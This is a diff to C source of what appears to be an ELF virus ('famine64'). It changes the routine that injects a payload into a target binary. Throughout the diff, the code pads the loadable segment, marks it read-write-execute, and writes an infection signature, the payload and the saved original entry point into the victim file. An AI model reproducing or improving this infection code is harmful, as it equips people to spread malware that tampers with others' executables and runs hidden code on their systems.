@@ -202,6 +202,7 @@ void		pack_dat_elf(char *path, int size, char *data)
 	Elf64_Shdr	*isection = NULL;
 	char		*s_table;
 	int			idx;
+	uint64_t	psize;
 
 	idx = ((Elf64_Ehdr *)data)->e_shstrndx;
 	s_table = (char *)(data + section[idx].sh_offset);
@@ -294,9 +295,10 @@ printf(" famine64_size: %#lx", famine64_size);
 	if (next_ptload != NULL)
 	{
 		Elf64_Addr	padding = 0;
-		if (iprogram->p_offset + iprogram->p_filesz + famine64_size > next_ptload->p_offset)
+		psize = famine64_size + sizeof(famine64_signature);
+		if (iprogram->p_offset + iprogram->p_filesz + psize > next_ptload->p_offset)
 		{
-			while (padding < famine64_size)
+			while (padding < psize)
 				padding += 0x1000;
 			/* Change Section Table offset */
 			((Elf64_Ehdr *)data)->e_shoff += padding;
@@ -317,7 +319,7 @@ printf(" famine64_size: %#lx", famine64_size);
 			}
 		}
 		else
-			padding = famine64_size;
+			padding = psize;
 		iprogram->p_filesz += padding;
 		iprogram->p_memsz += padding;
 		iprogram->p_flags = PF_R | PF_W | PF_X;
@@ -325,12 +327,13 @@ printf(" famine64_size: %#lx", famine64_size);
 		isection->sh_size += padding;
 	// #endif
 		syscall(WRITE, fd, data, off);
+		syscall(WRITE, fd, &famine64_signature, sizeof(famine64_signature));
 		syscall(WRITE, fd, &famine64_func, famine64_size - sizeof(old_entry));
 		syscall(WRITE, fd, &old_entry, sizeof(old_entry));
-		if (padding == famine64_size)
-			off += famine64_size;
+		if (padding == psize)
+			off += psize;
 		else
-			while (padding-- > famine64_size)
+			while (padding-- > psize)
 				syscall(WRITE, fd, "\0", 1);
 		syscall(WRITE, fd, data + off, size - off - 1);
 		syscall(CLOSE, fd);
